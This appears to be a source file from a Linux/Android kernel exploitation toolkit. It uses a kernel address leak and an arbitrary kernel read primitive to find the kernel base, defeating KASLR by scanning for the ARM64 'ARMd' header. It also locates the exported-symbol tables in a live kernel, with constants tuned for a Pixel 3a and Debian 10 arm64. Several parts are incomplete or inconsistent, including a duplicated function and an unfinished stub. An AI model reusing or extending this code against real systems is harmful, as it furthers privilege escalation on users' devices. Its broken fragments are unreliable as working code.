#include <stdint.h>
#include <stdio.h>

#include <localUtil.h>
#include <bgrep_e.h>
#include <ibeSet.h>
#include <krw_util.h>

#include <kernel_block.h>
#include <kern_img.h>
#include <kern_static.h>
#include <kern_dynamic.h>

#define HEAD_BUF_SZ     0x60

#if defined(__arm64__) || defined(__aarch64__)
#include <hdeA64.h>
#define hde_local hdeA64_t
#elif defined(__x86_64__)
#include <hde.h>
#define hde_local hde64s_t
// #else
// #error "no arch?"
#endif


// routine to be used for dynamic use, the relocation table will fill these up,
// maybe someday i can see how they are filled in static use as well.
int base_ksymtab_kcrctab_ksymtabstrings(kern_dynamic* kernel_local_target)
{
#define TARGET_KSYMTAB_SEARCH_STR followStr
    int result = -1;
    named_kmap_t* head_text_shdr = 0;
    named_kmap_t* init_text_shdr = 0;
    named_kmap_t* text_shdr = 0;
    size_t kBuffer = 0;
    size_t searchSz = 0;
    char searchStr[] = "module.sig_enforce";
    char followStr[] = "nomodule";
    symsearch* tmpSymSearch = 0;
    uint16_t poststr_block = 0;
    binary_ss module_ss((uint8_t*)followStr, sizeof(followStr), 0, 1, true);
    binary_ss nullterm_ss((uint8_t*)&poststr_block, sizeof(poststr_block), 0, 1, true);

    bool live_kernel = kernel_local_target->is_live_kernel();
    size_t ksymtab_base = 0;
    size_t ksymtab_gpl_base = 0;
    size_t kcrctab_base = 0;
    size_t kcrctab_gpl_base = 0;
    size_t ksymtab_strings_base = 0;

    // check if all 3 already exists
    FINISH_IF((kernel_local_target->check_kmap("__ksymtab", NULL) == 0) &&
        (kernel_local_target->check_kmap("__kcrctab", NULL) == 0) &&
        (kernel_local_target->check_kmap("__ksymtab_strings", NULL) == 0)
        );

    SAFE_BAIL(kernel_local_target->check_kmap(".head.text", &head_text_shdr) == -1);
    SAFE_BAIL(kernel_local_target->check_kmap(".init.text", &init_text_shdr) == -1);
    SAFE_BAIL(kernel_local_target->check_kmap(".text", &text_shdr) == -1);
    
    // if not, begin the search! brute force for our string, with an upper bound
    // limit of the .init.text section. Once we get there we have to stop
    // reading or kernel panic.

    // skip a section by starting at the .text, though if we can't guarantee
    // alignment.... may have to do .head.text, which should only be an
    // additional page or so.
    searchSz = init_text_shdr->kva - head_text_shdr->kva;
    SAFE_BAIL(kernel_local_target->kernel_search(&module_ss, head_text_shdr->kva, searchSz, true, (void**)&kBuffer) == -1);

    kBuffer = kBuffer + sizeof(TARGET_KSYMTAB_SEARCH_STR);
    BIT_PAD(kBuffer, size_t, 8);

    SAFE_BAIL(kernel_local_target->live_kern_addr(kBuffer, sizeof(symsearch) * 3, (void**)&tmpSymSearch) == -1);

    // index 0 and 1 are each the ksymtab and ksymtab_gpl respectively
    // index 2 bases the kcrc, but its end is the same as its entry. The end of it is the 
    // crcgpl, which is referenced by the gpl ksymtab
    ksymtab_base = (size_t)tmpSymSearch[0].start;
    ksymtab_gpl_base = (size_t)tmpSymSearch[1].start;
    kcrctab_base = (size_t)tmpSymSearch[2].start;
    kcrctab_gpl_base = (size_t)tmpSymSearch[1].crcs;
    ksymtab_strings_base = (size_t)tmpSymSearch[2].crcs;

    kernel_local_target->insert_section("__ksymtab", ksymtab_base, ksymtab_gpl_base - ksymtab_base);
    kernel_local_target->insert_section("__ksymtab_gpl", ksymtab_gpl_base, kcrctab_base - ksymtab_gpl_base);
    kernel_local_target->insert_section("__kcrctab", kcrctab_base, kcrctab_gpl_base - kcrctab_base);
    kernel_local_target->insert_section("__kcrctab_gpl", kcrctab_gpl_base, ksymtab_strings_base - kcrctab_gpl_base);

    SAFE_BAIL(kernel_local_target->kernel_search(&nullterm_ss, ksymtab_strings_base, init_text_shdr->kva - ksymtab_strings_base, true, (void**)&kBuffer) == -1);
    kernel_local_target->insert_section("__ksymtab_strings", ksymtab_strings_base, kBuffer - ksymtab_strings_base + 1);

    kernel_local_target->set_ksyms_count((kcrctab_base - ksymtab_base) / sizeof(kernel_symbol));
finish:
    result = 0;
fail:
    SAFE_LIVE_FREE(tmpSymSearch)
    return result;
}

unsigned long off4Text[] =
{
   0x146e0000, // this is a branch instruction, obviously fluctuates between devices
   0x00080000,
   0x03102000, // this qword fluctuates between devices, this is the value for 3a, 4a is 0x2475000
   0x0000000a, 0x00000000, 0x00000000, 0x00000000,
   0x644d5241, 0x00000000, 0x00000000, 0x00000000,
   0x00000000,
};

// pixel-3a
// Release:     android 11
// 4.xx
#ifdef PIXEL_KERN
int evaluate_found(uint8_t *buf)
{
    int result = -1;
    size_t bufInterp[sizeof(off4Text) / sizeof(size_t)] = {0};

    SAFE_BAIL(memcmp(&bufInterp[1], &off4Text[1], sizeof(off4Text) - sizeof(size_t)) != 0)

    result = 0;
fail:
    return result;
}
#endif

// debian
// Release:        10
// 4.19.0-20-arm64
int evaluate_found(uint8_t* buf)
{
    int result = -1;
    // hde_local instTemp;
    uint8_t* buftmp = buf;
    
    // SAFE_BAIL(CASE_ARM64_ENC(*(uint32_t*)buftmp, INSTCODE, BR_ENC) == 0);
    // buftmp += sizeof(uint32_t);
    // SAFE_BAIL(CASE_ARM64_ENC(*(uint32_t*)buftmp, INSTCODE, DPIMM_ENC) == 0);

    // ARMd@
    SAFE_BAIL(*(uint64_t*)(buf + 0x38) != 0x00000040644d5241);

finish:
    result = 0;
fail:
    return result;
}

#define DEBIAN_10_4_19_KERNEL_BASE 0xffff000008080000

// kbaseroll macros happen in 4 stages, incase it needs to be broken up
    // includes
    // variable definitions
    // presets before loop
    // comparator for a valid header
int kBaseRoll(size_t* kbase_a)
{
    int result = -1;
    size_t leakAddr = 0;
    uint8_t buf[HEAD_BUF_SZ] = {0};

    // kernel_leak
    kernel_leak(&leakAddr);
    leakAddr &= ~PAGE_MASK4K;

    for (int i = 0; i < 0x1000; i++)
    {
        kernel_read(buf, HEAD_BUF_SZ, leakAddr);
        FINISH_IF(evaluate_found(buf) == 0);
        leakAddr -= PAGE_SIZE4K;
    }

    goto fail;
finish:
    result = 0;
    if (kbase_a != 0)
    {
        *kbase_a = leakAddr;
    }
fail:
    return result;
}

int kernel_base_text(kern_dynamic* kernel_local_target)
{
    kernel_local_target;
}